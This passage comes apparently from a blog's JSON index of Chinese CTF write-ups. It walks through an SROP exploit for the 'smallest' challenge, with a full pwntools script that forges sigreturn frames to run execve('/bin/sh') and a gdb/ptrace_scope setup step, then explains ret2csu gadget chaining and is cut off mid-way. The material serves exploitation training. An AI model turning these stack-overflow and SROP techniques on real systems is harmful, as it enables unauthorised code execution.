p64(ret_addr)print(payload)update(name,payload)sh.recvuntil(&#x27;&gt;&#x27;)show()sh.interactive()","categories":[{"name":"Fomatstring","slug":"Fomatstring","permalink":"https://dawoxiansigema.github.io/categories/Fomatstring/"}],"tags":[]},{"title":"CTFwiki高级栈溢出","slug":"CTFwiki高级栈溢出","date":"2023-10-31T13:32:45.000Z","updated":"2023-10-31T13:42:39.155Z","comments":true,"path":"2023/10/31/CTFwiki高级栈溢出/","link":"","permalink":"https://dawoxiansigema.github.io/2023/10/31/CTFwiki%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"ctfwiki高级栈溢出部分题解","text":"ctfwiki高级栈溢出部分题解 SROP说在前头本文主要记录对于SROP的例题smallest的解法以及详细调试流程 对于SROP原理的学习还请参考下方大佬们的文章 1234567原理&lt;https://www.yuque.com/hxfqg9/bin/erh0l7&gt;&lt;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/&gt;&lt;https://firmianay.gitbook.io/ctf-all-in-one/6_writeup/pwn/6.1.4_pwn_backdoorctf2017_fun_signals#srop&gt;调试 重点看后一个小时&lt;https://www.bilibili.com/video/BV1444y1W71h/?buvid=XX5FC8453DF96FAD4F497BD710DC3F2C7EBBE&amp;is_story_h5=false&amp;mid=UDTW7FqRSfajqeacM5JjPA%3D%3D&amp;p=1&amp;plat_id=116&amp;share_from=ugc&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=e388ff6b-55ba-4323-891e-a723ade2c6e6&amp;share_source=WEIXIN&amp;share_tag=s_i&amp;timestamp=1680753732&amp;unique_k=nmY6JTR&amp;up_id=471708905&amp;vd_source=8686d2eff3478033f732d6a4c468b8e9&gt; 对于例题而言 smallest最合适不过了 代码量小 便于调试 由于经常性的调试 最后还是放弃了pwndocker 因为ssh类连接要去attach很麻烦 1echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope 记得执行一下 如果gdb报错的时候 调试审计从这开始默认已掌握SROP的原理 不懂请多看多调试 123456789101112131415.text:00000000004000B0.text:00000000004000B0 public start.text:00000000004000B0 start proc near ; DATA XREF: LOAD:0000000000400018↑o.text:00000000004000B0 xor rax, rax.text:00000000004000B3 mov edx, 400h ; count.text:00000000004000B8 mov rsi, rsp ; buf.text:00000000004000BB mov rdi, rax ; fd.text:00000000004000BE syscall ; LINUX - sys_read.text:00000000004000C0 retn.text:00000000004000C0 start endp.text:00000000004000C0.text:00000000004000C0 _text ends.text:00000000004000C0.text:00000000004000C0.text:00000000004000C0 end start SROP需要能对rax操作 有syscall以及ret 可以看到麻雀虽小五脏俱全 该有的他都有 对于SROP而言我们需要的是往rsp高地址写入寄存器数据 以达到伪造栈帧的作用 系统调用 调用号 函数原型 read 0 read(int fd, void *buf, size_t count) write 1 write(int fd, const void *buf, size_t count) sigreturn 15 int sigreturn(…) execve 59 execve(const char *filename, char *const argv[],char *const envp[]) 以上是我们此次解题所需要用到的内容 请注意此处所说的调用号值 我们需要到时候赋值给rax 1.text:00000000004000B0 xor rax, rax 对于此处代码而言 xor指令同取0 异取1 因此题目自带的系统调用就是read 再根据64位传参规则 可以得出start调用的read指令如下 12read(0,rsp,0x400)从rsp指针处往高地址写入0x400个数据 fd一般不管他 我们确实能够写入数据 但是如果光用read函数的话 我们不知道rsp指向哪 因此我们还需要有能够打印栈内数据的一个函数 是的那就是write 之前在libc泄漏时打印got表地址就经常用它(我之前还以为write这名字咋也应该是写入数据的) 不过write的第三个参数可以不要 那么他就会打印所有的 123read函数特性1.read函数是逐字节覆盖栈内数据的2.read函数会将读取的字节数返回给rax寄存器 如果我们输入一个字节 那么经过read的读入后 我们的rax会变为1 可是我们还需要跳过xor的指令 不然rax还会变成0 因此我们可以先利用read函数 读入2个程序的开始地址4000B0 那么在第一次ret之后 rsp就会指向第2个4000B0 我们再发送一个’\\xb3’即可 注意是send而不是sendline sendline会跟一个\\x0a 12345678910111213141516 低地址 低地址| | | | | | | || | | || | | || | | |+-----------------+&lt;---rsp | || 04000B0 | | |+-----------------+ +-----------------+&lt;---rsp| 04000B0 | | 04000B3 |+-----------------+ +-----------------+| | | || | | || | | ||-----------------| |-----------------| 高地址 高地址 栈结构如此的话 返回时rax记为1 且执行4000b3处指令 成功跳过置空rax 只不过从后期来看 在这步之后我们还需要继续写入fake frame 因此我们压入的需要3个4000b0 在此结构图不重新画了 同时不要忘了我们调用了write 和read一样 从rsp开始读0x400个字节数据 12345678910111213141516171819202122232425262728293031323334from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]sh = process(&#x27;./smallest&#x27;)gdb.attach(sh)start_addr = 0x00000000004000B0syscall_addr = 0x00000000004000bepayload = p64(start_addr) * 3sh.send(payload)payload = &#x27;\\\\xb3&#x27;sh.send(payload)ret_addr = u64(sh.recv()[8:15].ljust(8,&#x27;\\\\0&#x27;)) #前8个是我们自己设置的第三个start_addrprint hex(ret_addr)#ret_addr = 0x7fffc60503f8[DEBUG] Received 0x400 bytes: 00000000 b0 00 40 00 00 00 00 00 f8 03 05 c6 ff 7f 00 00 │··@·│····│····│····│ 00000010 24 04 05 c6 ff 7f 00 00 31 04 05 c6 ff 7f 00 00 │$···│····│1···│····│ 00000020 51 04 05 c6 ff 7f 00 00 66 04 05 c6 ff 7f 00 00 │Q···│····│f···│····│ 00000030 77 04 05 c6 ff 7f 00 00 85 04 05 c6 ff 7f 00 00 │w···│····│····│····│ 00000040 90 04 05 c6 ff 7f 00 00 0f 05 05 c6 ff 7f 00 00 │····│····│····│····│ 00000050 1a 05 05 c6 ff 7f 00 00 2b 05 05 c6 ff 7f 00 00 │····│····│+···│····│0000| 0x7fffc604f270 --&gt; 0x4000b0 (xor rax,rax)0008| 0x7fffc604f278 --&gt; 0x7fffc60503f8 (&quot;GNOME_DESKTOP_SESSION_ID=this-is-deprecated&quot;)0016| 0x7fffc604f280 --&gt; 0x7fffc6050424 (&quot;WINDOWPATH=2&quot;)0024| 0x7fffc604f288 --&gt; 0x7fffc6050431 (&quot;LESSOPEN=| /usr/bin/lesspipe %s&quot;)0032| 0x7fffc604f290 --&gt; 0x7fffc6050451 (&quot;XDG_SESSION_TYPE=x11&quot;)0040| 0x7fffc604f298 --&gt; 0x7fffc6050466 (&quot;QT_IM_MODULE=xim&quot;)0048| 0x7fffc604f2a0 --&gt; 0x7fffc6050477 (&quot;LOGNAME=apple&quot;)0056| 0x7fffc604f2a8 --&gt; 0x7fffc6050485 (&quot;USER=apple&quot;) 估摸着刚刚有人有疑惑 为啥04000b0最后的1个字节却是最开始修改的 原因在于数据是小端序 反过来存储的 对着栈结构一看就知道 第二个问题是我当时遇到过的 因为往后要往栈内写入大量数据 但是这样不是会破坏栈结构吗 那样某种意义上不是和栈溢出一样吗 贴一个后面写入frame后的栈结构 12345678910111213141516171819202122232425Before:0208| 0x7ffc092dfb38 --&gt; 0x7ffc092e16ea (&quot;USERNAME=apple&quot;)0216| 0x7ffc092dfb40 --&gt; 0x7ffc092e16f9 (&quot;XDG_SESSION_DESKTOP=ubuntu&quot;)0224| 0x7ffc092dfb48 --&gt; 0x7ffc092e1714 (&quot;XDG_RUNTIME_DIR=/run/user/1000&quot;)0232| 0x7ffc092dfb50 --&gt; 0x7ffc092e1733 (&quot;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&quot;)0240| 0x7ffc092dfb58 --&gt; 0x7ffc092e175c (&quot;VTE_VERSION=5202&quot;)0248| 0x7ffc092dfb60 --&gt; 0x7ffc092e176d (&quot;GDMSESSION=ubuntu&quot;)0256| 0x7ffc092dfb68 --&gt; 0x7ffc092e177f (&quot;XMODIFIERS=@im=ibus&quot;)0264| 0x7ffc092dfb70 --&gt; 0x7ffc092e1793 (&quot;TEXTDOMAINDIR=/usr/share/locale/&quot;)0272| 0x7ffc092dfb78 --&gt; 0x7ffc092e17b4 (&quot;GNOME_SHELL_SESSION_MODE=ubuntu&quot;)0280| 0x7ffc092dfb80 --&gt; 0x7ffc092e17d4 (&quot;XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg&quot;)0288| 0x7ffc092dfb88 --&gt; 0x7ffc092e1801 (&quot;XDG_CURRENT_DESKTOP=ubuntu:GNOME&quot;)After:0208| 0x7ffc092dfb38 --&gt; 0x0 0216| 0x7ffc092dfb40 --&gt; 0x0 0224| 0x7ffc092dfb48 --&gt; 0x0 0232| 0x7ffc092dfb50 --&gt; 0x0 0240| 0x7ffc092dfb58 --&gt; 0x0 0248| 0x7ffc092dfb60 --&gt; 0x0 0256| 0x7ffc092dfb68 --&gt; 0x0 0264| 0x7ffc092dfb70 --&gt; 0x7ffc092e1793 (&quot;TEXTDOMAINDIR=/usr/share/locale/&quot;)0272| 0x7ffc092dfb78 --&gt; 0x7ffc092e17b4 (&quot;GNOME_SHELL_SESSION_MODE=ubuntu&quot;)0280| 0x7ffc092dfb80 --&gt; 0x7ffc092e17d4 (&quot;XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg&quot;)0288| 0x7ffc092dfb88 --&gt; 0x7ffc092e1801 (&quot;XDG_CURRENT_DESKTOP=ubuntu:GNOME&quot;) 确实没错 不过对于系统调用而言 在正常的流程中是会保留进程栈的上下文的 只不过我们为了实现攻击 直接从寄存器数据入栈开始了 一般的调用是会保存、恢复数据的 Frame构造frame的构造就按部就班了 12345678910read = SigreturnFrame()read.rax = constants.SYS_readread.rdi = 0read.rsi = stack_addrread.rdx = 0x400read.rsp = stack_addrread.rip = syscall_retread_frame_payload = p64(start_addr) + p64(syscall_ret) + str(read)sh.send(read_frame_payload)sh.send(read_frame_payload[8:8+15]) 首先我们构造了一个read(0,stack_addr,0x400)的frame 并且利用之前传入的第三个start_addr 调用系统自带的read函数 将这个frame压入栈中 只不过压入伪造的frame之后 还需要将rax设置为0xF 12345678910pwndbg&gt; stack 2500:0000│ rsi rsp 0x7ffc109bcb18 —▸ 0x4000b0 ◂— xor rax, rax01:0008│ 0x7ffc109bcb20 —▸ 0x4000be ◂— syscall 02:0010│ 0x7ffc109bcb28 ◂— 0x0... ↓10:0080│ 0x7ffc109bcb98 —▸ 0x7ffc109bd3f8 ◂— &#x27;GNOME_DESKTOP_SESSION_ID=this-is-deprecated&#x27;11:0088│ 0x7ffc109bcba0 ◂— 0x0... ↓13:0098│ 0x7ffc109bcbb0 ◂— 0x40014:00a0│ 0x7ffc109bcbb8 ◂— 0x0 由于我们的syscall后接的是ret 这个栈是我们syscall时压入的 那么接的ret会将rsp所在位置pop给rip 成为ret地址 那么我们将其设置为start_addr后 就又可以调用read了 此时我们再读入一次payload 去掉前面的start_addr(因为已经pop了) 再发送15字节 即可完成系统调用 当然还有syscall 不用说 123456789execve = SigreturnFrame()execve.rax=constants.SYS_execveexecve.rdi=?execve.rsi=0x0execve.rdx=0x0execve.rsp=stack_addrexecve.rip=syscall_retexecv_frame_payload=p64(start_addr)+p64(syscall_ret)+str(execve)shell = execv_frame_payload + &#x27;/bin/sh\\\\x00&#x27; execve的也同理了 只不过单有execve还不行 我们的&#x2F;bin&#x2F;sh字符串地址还需要找到 也就是rdi处所需要的值 rdi处的值我们可以不填 先发送payload 然后观察偏移量 123456[+] leak stack addr :0x7ffc1d7c33f819:00c8│ 0x7ffc1d7c34c8 ◂— 0x0... ↓20:0100│ 0x7ffc1d7c3500 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */21:0108│ 0x7ffc1d7c3508 ◂— 0x58006e69622f7061 /* &#x27;ap/bin&#x27; */ 0x500-0x3f8&#x3D;0x108 于是execve.rdi&#x3D;stack_addr + 0x108即可 完整exp如下 12345678910111213141516171819202122232425262728293031323334353637383940414243#coding=utf8from pwn import *sh = process(&#x27;./smallest&#x27;)small = ELF(&#x27;./smallest&#x27;)context.arch = &#x27;amd64&#x27;#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;syscall_ret = 0x00000000004000BEstart_addr = 0x00000000004000B0#gdb.attach(sh)payload = p64(start_addr) * 3sh.send(payload)sh.send(&#x27;\\\\xb3&#x27;)stack_addr = u64(sh.recv()[8:16])log.success(&#x27;leak stack addr :&#x27; + hex(stack_addr))read = SigreturnFrame()read.rax = constants.SYS_readread.rdi = 0read.rsi = stack_addrread.rdx = 0x400read.rsp = stack_addrread.rip = syscall_retread_frame_payload = p64(start_addr) + p64(syscall_ret) + str(read)sh.send(read_frame_payload)sh.send(read_frame_payload[8:8+15])execve = SigreturnFrame()execve.rax=constants.SYS_execveexecve.rdi=stack_addr + 0x108execve.rsi=0x0execve.rdx=0x0execve.rsp=stack_addrexecve.rip=syscall_retexecv_frame_payload=p64(start_addr)+p64(syscall_ret)+str(execve)execv_frame_payload_all=execv_frame_payload+&#x27;/bin/sh\\\\x00&#x27;sh.send(execv_frame_payload_all)sh.send(execv_frame_payload_all[8:8+15])sh.interactive() 当然 rdi那边也可以随便设置个值 比如0x150 然后这样 123execve.rdi=stack_addr + 0x150print len(frame_payload)payload = frame_payload + (0x150 - len(frame_payload)) * &#x27;\\\\x00&#x27; + &#x27;/bin/sh\\\\x00&#x27; 解个惑我相信有人会有疑问 为什么要系统调用一个read 再输入系统调用的execve呢 干脆直接用第三个构造的start地址来输入execve的栈帧不行吗 12345678910111213141516171819[+] leak stack addr = 0x7ffd4c3893f8pwndbg&gt; stack 5000:0000│ rsi rsp 0x7ffd4c388610 —▸ 0x4000be ◂— syscall 01:0008│ 0x7ffd4c388618 ◂— 0x0... ↓0e:0070│ 0x7ffd4c388680 —▸ 0x7ffd4c388670 ◂— 0x00f:0078│ 0x7ffd4c388688 ◂— 0x0... ↓13:0098│ 0x7ffd4c3886a8 ◂— 0x3b /* &#x27;;&#x27; */14:00a0│ 0x7ffd4c3886b0 ◂— 0x015:00a8│ 0x7ffd4c3886b8 —▸ 0x7ffd4c3893f8 ◂— &#x27;GNOME_DESKTOP_SESSION_ID=this-is-deprecated&#x27;16:00b0│ 0x7ffd4c3886c0 —▸ 0x4000be ◂— syscall 17:00b8│ 0x7ffd4c3886c8 ◂— 0x018:00c0│ 0x7ffd4c3886d0 ◂— 0x33 /* &#x27;3&#x27; */19:00c8│ 0x7ffd4c3886d8 ◂— 0x0... ↓20:0100│ 0x7ffd4c388710 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */21:0108│ 0x7ffd4c388718 —▸ 0x7ffd4c3897b4 ◂— &#x27;GNOME_SHELL_SESSION_MODE=ubuntu&#x27; 这是我用自带的read函数 写入的execve栈帧 可以看到我们的start_addr与syscall处值相差很大 更关键的是每次这个值都不一样的大 再来看看用系统调用的 123456789101112131415[+] leak stack addr = 0x7ffe0cdef3f8pwndbg&gt; stack 2500:0000│ rsi rsp 0x7ffe0cdef400 —▸ 0x4000be ◂— syscall 01:0008│ 0x7ffe0cdef408 ◂— 0x0... ↓0e:0070│ 0x7ffe0cdef470 —▸ 0x7ffe0cdef500 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */0f:0078│ 0x7ffe0cdef478 ◂— 0x0... ↓13:0098│ 0x7ffe0cdef498 ◂— 0x3b /* &#x27;;&#x27; */14:00a0│ 0x7ffe0cdef4a0 ◂— 0x015:00a8│ 0x7ffe0cdef4a8 —▸ 0x7ffe0cdef3f8 —▸ 0x4000b0 ◂— xor rax, rax16:00b0│ 0x7ffe0cdef4b0 —▸ 0x4000be ◂— syscall 17:00b8│ 0x7ffe0cdef4b8 ◂— 0x018:00c0│ 0x7ffe0cdef4c0 ◂— 0x33 /* &#x27;3&#x27; */ 每次都只差0x08 原因如下 我得贴一段很长的代码 123456789101112131415161718syscall read输入前栈结构0000| 0x7ffc5e3085a8 --&gt; 0x7ffc5e30a3f8 (&quot;GNOME_DESKTOP_SESSION_ID=this-is-deprecated&quot;)0008| 0x7ffc5e3085b0 --&gt; 0x7ffc5e30a424 (&quot;WINDOWPATH=2&quot;)0016| 0x7ffc5e3085b8 --&gt; 0x7ffc5e30a431 (&quot;LESSOPEN=| /usr/bin/lesspipe %s&quot;)0024| 0x7ffc5e3085c0 --&gt; 0x7ffc5e30a451 (&quot;XDG_SESSION_TYPE=x11&quot;)0032| 0x7ffc5e3085c8 --&gt; 0x7ffc5e30a466 (&quot;QT_IM_MODULE=xim&quot;)0040| 0x7ffc5e3085d0 --&gt; 0x7ffc5e30a477 (&quot;LOGNAME=apple&quot;)0048| 0x7ffc5e3085d8 --&gt; 0x7ffc5e30a485 (&quot;USER=apple&quot;)输入后栈结构0000| 0x7ffc5e3085a8 --&gt; 0x4000b0 (xor rax,rax)0008| 0x7ffc5e3085b0 --&gt; 0x4000be (syscall)0016| 0x7ffc5e3085b8 --&gt; 0x0 0024| 0x7ffc5e3085c0 --&gt; 0x0 0032| 0x7ffc5e3085c8 --&gt; 0x0 0040| 0x7ffc5e3085d0 --&gt; 0x0 0048| 0x7ffc5e3085d8 --&gt; 0x0 可以看到 对于syscall的read而言 他是直接往当前rsp在的指针位置开始写入覆盖 而对于sigreturn的read而言的话 123456789101112131415161718sigreturn read输入前栈结构0000| 0x7ffd947fd3f8 (&quot;GNOME_DESKTOP_SESSION_ID=this-is-deprecated&quot;)0008| 0x7ffd947fd400 (&quot;SKTOP_SESSION_ID=this-is-deprecated&quot;)0016| 0x7ffd947fd408 (&quot;SSION_ID=this-is-deprecated&quot;)0024| 0x7ffd947fd410 (&quot;=this-is-deprecated&quot;)0032| 0x7ffd947fd418 (&quot;-deprecated&quot;)0040| 0x7ffd947fd420 --&gt; 0x444e495700646574 (&#x27;ted&#x27;)0048| 0x7ffd947fd428 (&quot;OWPATH=2&quot;)输入后栈结构0000| 0x7ffd947fd3f8 --&gt; 0x4000b0 (xor rax,rax)0008| 0x7ffd947fd400 --&gt; 0x4000be (syscall)0016| 0x7ffd947fd408 --&gt; 0x0 0024| 0x7ffd947fd410 --&gt; 0x0 0032| 0x7ffd947fd418 --&gt; 0x0 0040| 0x7ffd947fd420 --&gt; 0x0 0048| 0x7ffd947fd428 --&gt; 0x0 我们看到调用了sigreturn的read之后 我们的栈跳到了真正存储这些数据的栈地址 也就是我们之前获取的stack_addr里存放的指针所指向的地址 因此我们写入的binsh地址减去他就一定是定值了 这才是sigreturn的read在此题的大作用 提速对于frame的构造 我们如果能够快速知道有哪些寄存器是我们能够控制的 那么对于我的exp的编写速度是一个提升 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152apple@ubuntu ~/Desktop&gt; ipythonPython 2.7.17 (default, Mar 8 2023, 18:40:28) Type &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.IPython 5.5.0 -- An enhanced Interactive Python.? -&gt; Introduction and overview of IPython&#x27;s features.%quickref -&gt; Quick reference.help -&gt; Python&#x27;s own help system.object? -&gt; Details about &#x27;object&#x27;, use &#x27;object??&#x27; for extra details.In [1]: from pwn import *In [2]: context.arch = &#x27;amd64&#x27;In [3]: s = SigreturnFrame()In [4]: s.__dict__Out[4]: &#123;&#x27;_regs&#x27;: [&#x27;uc_flags&#x27;, &#x27;&amp;uc&#x27;, &#x27;uc_stack.ss_sp&#x27;, &#x27;uc_stack.ss_flags&#x27;, &#x27;uc_stack.ss_size&#x27;, &#x27;r8&#x27;, &#x27;r9&#x27;, &#x27;r10&#x27;, &#x27;r11&#x27;, &#x27;r12&#x27;, &#x27;r13&#x27;, &#x27;r14&#x27;, &#x27;r15&#x27;, &#x27;rdi&#x27;, &#x27;rsi&#x27;, &#x27;rbp&#x27;, &#x27;rbx&#x27;, &#x27;rdx&#x27;, &#x27;rax&#x27;, &#x27;rcx&#x27;, &#x27;rsp&#x27;, &#x27;rip&#x27;, &#x27;eflags&#x27;, &#x27;csgsfs&#x27;, &#x27;err&#x27;, &#x27;trapno&#x27;, &#x27;oldmask&#x27;, &#x27;cr2&#x27;, &#x27;&amp;fpstate&#x27;, &#x27;__reserved&#x27;, &#x27;sigmask&#x27;], &#x27;arch&#x27;: &#x27;amd64&#x27;, &#x27;endian&#x27;: &#x27;little&#x27;, &#x27;size&#x27;: 248&#125;","categories":[{"name":"Stack/Advanced","slug":"Stack-Advanced","permalink":"https://dawoxiansigema.github.io/categories/Stack-Advanced/"}],"tags":[]},{"title":"CTFwiki基本栈溢出","slug":"CTFwiki基本栈溢出","date":"2023-10-31T13:30:35.000Z","updated":"2023-10-31T13:42:46.250Z","comments":true,"path":"2023/10/31/CTFwiki基本栈溢出/","link":"","permalink":"https://dawoxiansigema.github.io/2023/10/31/CTFwiki%E5%9F%BA%E6%9C%AC%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"ctfwiki基本栈溢出部分题解","text":"ctfwiki基本栈溢出部分题解 ret2csu原理ret2csu的思路具有一定的通杀性 因为该方法基于的是__libc_csu_init函数 该函数基本所有动态链接程序都会含有 举一个wiki上的例子 12write(1,__libc_start_main_got,8)payload = &#x27;a&#x27; * padding + pop_rdi + 1 + pop_rsi + __libc_start_main_got + pop_rbx + 8 + ret_addr 在64位环境下 如果想要实现libc泄漏 假如使用write函数的话 会发现相当的麻烦 因为构造payload本身不是很难 但是关键是要找到合适的gadget 12345678910# apple @ Macbook-Pro in ~/Desktop [21:53:38] $ ropgadget --binary level5 --only &#x27;pop|ret&#x27;Gadgets information============================================================0x0000000000400512 : pop rbp ; ret0x0000000000400511 : pop rbx ; pop rbp ; ret0x0000000000400417 : ret0x0000000000400442 : ret 0x200bUnique gadgets found: 4 因为你看 根本就没有 于是乎我们必须要另寻他路 ret2csu的目的就是利用__libc_csu_init函数中的部分代码 通过构造栈结构来实现取代Ropgadget的效果 123456789101112131415161718.text:00000000004005F0 loc_4005F0: ; CODE XREF: __libc_csu_init+64↓j.text:00000000004005F0 mov rdx, r15.text:00000000004005F3 mov rsi, r14.text:00000000004005F6 mov edi, r13d.text:00000000004005F9 call qword ptr [r12+rbx*8].text:00000000004005FD add rbx, 1.text:0000000000400601 cmp rbx, rbp.text:0000000000400604 jnz short loc_4005F0.text:0000000000400606.text:0000000000400606 loc_400606: ; CODE XREF: __libc_csu_init+48↑j.text:0000000000400606 mov rbx, [rsp+38h+var_30].text:000000000040060B mov rbp, [rsp+38h+var_28].text:0000000000400610 mov r12, [rsp+38h+var_20].text:0000000000400615 mov r13, [rsp+38h+var_18].text:000000000040061A mov r14, [rsp+38h+var_10].text:000000000040061F mov r15, [rsp+38h+var_8].text:0000000000400624 add rsp, 38h.text:0000000000400628 retn 截取了__libc_csu_init的两个子函数 从400606到400628中 对rbx到rsp7个寄存器进行赋值操作 其中除了rsp寄存器以外其余的我们都可以通过构造栈空间的方式进行控制 1234567891011121314151617181920.text:0000000000400606 loc_400606: ; CODE XREF: __libc_csu_init+48↑j.text:0000000000400606 mov rbx, [rsp+38h+var_30].text:000000000040060B mov rbp, [rsp+38h+var_28].text:0000000000400610 mov r12, [rsp+38h+var_20].text:0000000000400615 mov r13, [rsp+38h+var_18].text:000000000040061A mov r14, [rsp+38h+var_10].text:000000000040061F mov r15, [rsp+38h+var_8].text:0000000000400624 add rsp, 38h.text:0000000000400628 retn.text:0000000000400616 loc_400616: ; CODE XREF: __libc_csu_init+34j.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx.text:000000000040061B pop rbp.text:000000000040061C pop r12.text:000000000040061E pop r13.text:0000000000400620 pop r14.text:0000000000400622 pop r15.text:0000000000400624 retn.text:0000000000400624 __libc_csu_init endp 请注意 以上是我提取了两个不同程序的同一部分代码 可以看到下部分是pop 上部分是mov指令 其实二者没有区别 都是对寄存器进行赋值操作 只不过一个是直接pop 另一个是通过改变rsp指针位置 不过mov办法的具体var_xx数值需要我们进行动态调试 123456789.text:00000000004005F0 loc_4005F0: ; CODE XREF: __libc_csu_init+64↓j.text:00000000004005F0 mov rdx, r15.text:00000000004005F3 mov rsi, r14.text:00000000004005F6 mov edi, r13d.text:00000000004005F9 call qword ptr [r12+rbx*8].text:00000000004005FD add rbx, 1.text:0000000000400601 cmp rbx, rbp.text:0000000000400604 jnz short loc_4005F0.text:0000000000400606 这段代码很好理解 如果结合上述所说 我们控制的r13-15寄存器可以为rdx rsi edi寄存器进行赋值 64位传参的前3个寄存器是rdi rsi rdx 后两个有了 还差一个rdi 1.text:00000000004005F6 mov edi, r13d r13的低32位赋值给edi 因此rdi的低32位就确定了 调试过程中发现执行到此时rdi的高32位为0 那么就代表我们可以控制rdi寄存器了 如果我们设置rbx为0的话 那么call的就是r12的地址了 在设置rbp为1 那么cmp的结果相等 就不会实行跳转 初步的payload可以写成如下 12345678910csu1 = 0x400606csu2 = 0x4005F0def csu(rbx,rbp,r12,r13,r14,r15,ret): payload = &#x27;a&#x27; * 136 payload += p64(csu1) payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu2)csu(0,1,write_got,8,write_got) 细心的师傅肯定想到一个问题 这不是和libc泄漏很像吗 那为啥libc泄漏call的是plt表而这里是got表 那是因为对于libc泄漏而言 我们控制的是返回地址 返回地址所填写的必须是一个指令 而got表中存储的是指令的地址 对于此题而言 单纯的call就得填写指令的地址了 因为返回地址最后得pop eip 123456789101153: 0000000000000000 0 FUNC GLOBAL DEFAULT UND read@@GLIBC_2.2.554: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@@GLIBC_55: 0000000000601018 0 NOTYPE GLOBAL DEFAULT 24 __data_start56: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__57: 0000000000601020 0 OBJECT GLOBAL HIDDEN 24 __dso_handle58: 0000000000400688 4 OBJECT GLOBAL DEFAULT 15 _IO_stdin_used59: 00000000004005a0 137 FUNC GLOBAL DEFAULT 13 __libc_csu_init60: 0000000000601038 0 NOTYPE GLOBAL DEFAULT ABS _end61: 0000000000400460 0 FUNC GLOBAL DEFAULT 13 _start62: 0000000000601028 0 NOTYPE GLOBAL DEFAULT ABS __bss_start63: 0000000000400564 47 FUNC GLOBAL DEFAULT 13 main 还有一个问题就是 就像libc泄漏一样 一趟是没法解决问题的 我们必须可持续发展 在结束后还得ret到main函数中 对于4005F0而言 并没有ret指令 那么我们必须借用400606的 123456789101112131415161718.text:00000000004005F0 loc_4005F0: ; CODE XREF: __libc_csu_init+64↓j.text:00000000004005F0 mov rdx, r15.text:00000000004005F3 mov rsi, r14.text:00000000004005F6 mov edi, r13d.text:00000000004005F9 call qword ptr [r12+rbx*8].text:00000000004005FD add rbx, 1.text:0000000000400601 cmp rbx, rbp.text:0000000000400604 jnz short loc_4005F0.text:0000000000400606.text:0000000000400606 loc_400606: ; CODE XREF: __libc_csu_init+48↑j.text:0000000000400606 mov rbx, [rsp+38h+var_30].text:000000000040060B mov rbp, [rsp+38h+var_28].text:0000000000400610 mov r12, [rsp+38h+var_20].text:0000000000400615 mov r13, [rsp+38h+var_18].text:000000000040061A mov r14, [rsp+38h+var_10].text:000000000040061F mov r15, [rsp+38h+var_8].text:0000000000400624 add rsp, 38h.text:0000000000400628 retn 因此我们设置rbx&#x3D;0 这样+1以后就会相等 跳过jnz 之后由于最后将esp+&#x3D;0x38 那么为了覆盖掉 我们还需要0x38个字节 csu1 + 参数 + 返回地址(csu2) + padding + 返回地址(main) 123456789101112csu1 = 0x400606csu2 = 0x4005F0def csu(rbx,rbp,r12,r13,r14,r15,ret): payload = &#x27;a&#x27; * 136 payload += p64(csu1) payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu2) payload += &#x27;a&#x27; * 0x38 payload += p64(main)csu(0,1,write_got,8,write_got,main) 这样一个基本的思路就清晰了 现在开始解题 不过这个level5编译版本太老了 我自己编译了一个 123456789101112131415161718.text:0000000000400600 loc_400600: ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400600 mov rdx, r13.text:0000000000400603 mov rsi, r14.text:0000000000400606 mov edi, r15d.text:0000000000400609 call qword ptr [r12+rbx*8].text:000000000040060D add rbx, 1.text:0000000000400611 cmp rbx, rbp.text:0000000000400614 jnz short loc_400600.text:0000000000400616.text:0000000000400616 loc_400616: ; CODE XREF: __libc_csu_init+34↑j.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx.text:000000000040061B pop rbp.text:000000000040061C pop r12.text:000000000040061E pop r13.text:0000000000400620 pop r14.text:0000000000400622 pop r15.text:0000000000400624 retn 400600基本没差别 关键在于400616处 此处并没有告诉我们关于rsp的堆栈操作 我们无法从ida得知400616与ret地址之间的padding 123456789101112► 0x400616 &lt;__libc_csu_init+86&gt; add rsp, 8 0x40061a &lt;__libc_csu_init+90&gt; pop rbx 0x40061b &lt;__libc_csu_init+91&gt; pop rbp 0x40061c &lt;__libc_csu_init+92&gt; pop r12 0x40061e &lt;__libc_csu_init+94&gt; pop r13 0x400620 &lt;__libc_csu_init+96&gt; pop r14 0x400622 &lt;__libc_csu_init+98&gt; pop r15 0x400624 &lt;__libc_csu_init+100&gt; ret ↓ 0x7ffff7df1040 &lt;__libc_start_main+128&gt; mov rdx, qword ptr [rip + 0x1c7e19] 0x7ffff7df1047 &lt;__libc_start_main+135&gt; mov eax, dword ptr [rdx + 0x210] 0x7ffff7df104d &lt;__libc_start_main+141&gt; test eax, eax 这是我在动调时看到的 在400624之后 ret到的是&lt;__libc_start_main+128&gt; 这个地址 那么我去看了眼栈结构 12345678900:0000│ rsp 0x7fffffffe560 —▸ 0x7ffff7fbe2e8 (__exit_funcs_lock) ◂— 0x001:0008│ 0x7fffffffe568 —▸ 0x4005c0 (__libc_csu_init) ◂— push r1502:0010│ 0x7fffffffe570 ◂— 